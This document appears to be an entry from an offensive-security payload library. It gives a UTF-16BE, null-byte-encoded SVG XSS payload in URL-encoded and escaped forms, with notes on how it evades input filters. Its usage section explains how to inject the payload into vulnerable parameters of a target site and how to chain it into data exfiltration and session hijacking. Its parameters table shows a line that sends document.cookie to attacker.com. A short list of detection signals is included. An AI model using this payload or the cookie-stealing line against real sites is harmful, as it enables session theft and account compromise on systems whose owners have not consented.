---
id: 1a2d251b-3483-4259-823c-44073d2de2cd
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.076899+00:00'
updated_at: '2023-04-10T20:21:45.018285+00:00'
tags:
  - xss
  - payload
  - bypass
  - utf-16be
  - svg
platforms:
  - Web
validated: true
---

# UTF-16BE-Encoded-SVG-XSS-Payload

## Code

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a%00d%00=\x00a\x00l%00e%00r%00t%00(\x00)\x00>
```

## Description

This code snippet is a UTF-16BE encoded version of the SVG XSS payload '<svg/onload=alert()>'. The encoding inserts null bytes (\x00) between each character, allowing it to bypass filters that do not process UTF-16BE. When decoded and rendered by the browser, it creates an inline SVG element that executes the JavaScript alert() function on load, demonstrating XSS execution. The first line is URL-encoded for use in HTTP parameters, while the second is a direct string representation with escape sequences.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload with no variables; substitute alert() with other JS if needed for escalation (e.g., document.location='http://attacker.com?cookie='+document.cookie). | N/A |

## Usage

Embed this payload in vulnerable web inputs like search queries, form fields, or URL parameters to test for XSS. For example, in a reflected XSS context: http://target.com/search?q=[paste URL-encoded version]. Use a proxy like Burp Suite to craft requests if browser encoding interferes. Once injected, load the page to trigger the alert. This is ideal for initial vulnerability confirmation before chaining to data exfiltration or session hijacking in procedures like [[procedures/UTF-16BE-Bypass-with-SVG-Alert-Injection]].

## Detection

- Web Application Firewalls (WAFs) scanning for SVG tags, onload events, or null bytes in inputs.
- Browser developer tools showing unexpected SVG elements or JS execution in reflected content.
- Server logs with UTF-16BE encoded strings or %00 sequences in parameters.
- Content Security Policy (CSP) violations if inline scripts are blocked.
- Endpoint detection tools monitoring for alert() calls or anomalous DOM manipulations.
